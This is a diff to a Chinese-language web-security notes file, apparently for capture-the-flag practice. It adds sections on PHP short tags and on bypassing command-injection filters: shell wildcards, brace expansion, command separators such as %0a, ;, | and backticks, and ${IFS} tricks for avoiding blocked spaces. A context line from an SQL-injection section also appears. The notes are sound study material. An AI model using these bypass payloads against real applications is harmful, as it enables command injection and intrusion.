@@ -1,9 +1,5 @@
 # Web Notes
 
-[TOC]
-
-
-
 ### robots.txt
 
 **robots.txt**是一种存放于**网站根目录下**的ASCII编码的文本文件，它通常告诉网络搜索引擎的漫游器（又称**爬虫**），此网站中的哪些内容是**不应被搜索引擎的漫游器获取的**，哪些是**可以被漫游器获取**的。
@@ -458,3 +454,110 @@ DROP sampletable;#
 php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡流量、系统负载、服务器时间等信息。
 
 一个比较常见的探针是**雅黑PHP探针**，默认地址是**tz.php**。
+
+### php短标签
+
+在php的配置文件php.ini中有一个`short_open_tag`的值，开启以后可以使用PHP的短标签：`<? ?>`。同时，只有开启这个才可以使用 `<?=` 以代替 `<? echo`。不过**在php7中这个标签被移除了**。
+
+### 命令执行绕过
+
+**通配符**
+
+`?`：匹配任何**一个**字符，需要知道文件名的长度
+
+```bash
+$ cat f???
+flag{123}
+```
+
+`*`：匹配全部字符
+
+```bash
+$ cat *
+flag{123}
+```
+
+`[]`：一个范围
+
+```bash
+[abc]  // 匹配abc之中的任意一个字符
+[a-z]  // 匹配a到z中的任意一个字符
+$ cat fl[a-c]g
+flag{123}
+```
+
+`{..}`：生产序列，以逗号分隔，且不能有空格
+
+```bash
+$ touch {a..d}
+$ ls 
+a b c d
+
+$ touch{1,2}
+$ ls
+1 2
+
+$ {cat,flag}
+flag{123}
+
+$ echo {{A..Z},{a..z}}
+A B C D E F G H I J K L M N O P Q R S T U V W X Y Z a b c d e f g h i j k l m n o p q r s t u v w x y z
+```
+
+`{...}`与`[...]`有一个很重要的区别。如果匹配的文件不存在，`[...]`会失去模式的功能，变成一个单纯的字符串，而`{...}`依然可以展开。
+
+```bash
+$ ls [ab].txt
+ls: [ab].txt: No such file or directory
+
+$ ls {a,b}.txt
+ls: a.txt: No such file or directory
+ls: b.txt: No such file or directory
+```
+
+**命令分隔于执行多条命令**
+
+Unix
+
+```bash
+%0a
+%0d
+;
+&
+|
+$(shell_command)`shell_command`{shell_command,}
+```
+
+Windows
+
+```bash
+%0a
+&
+|
+%1a - 一个神奇的角色，作为.bat文件中的命令分隔符
+```
+
+**空格过滤**
+
+`${IFS}`：IFS是internal field separator的缩写，shell的特殊环境变量
+
+```bash
+$ cat${IFS}flag
+flag{123}
+
+$ cat$IFS$9flag  （使$IFS被当成一个整体，cat$IFSflag会把$IFSflag当成一个变量）
+flag{123}
+```
+
+ 
+
+`<>file`：以读写模式打开文件（默认情况下在文件描述符0（stdin）上，如`<`），不会被截断，如果file不存在，则会创建文件。
+
+```bash
+$ cat<flag
+flag{123}
+
+$ cat<>flag #需要写权限
+flag{123}
+```
+
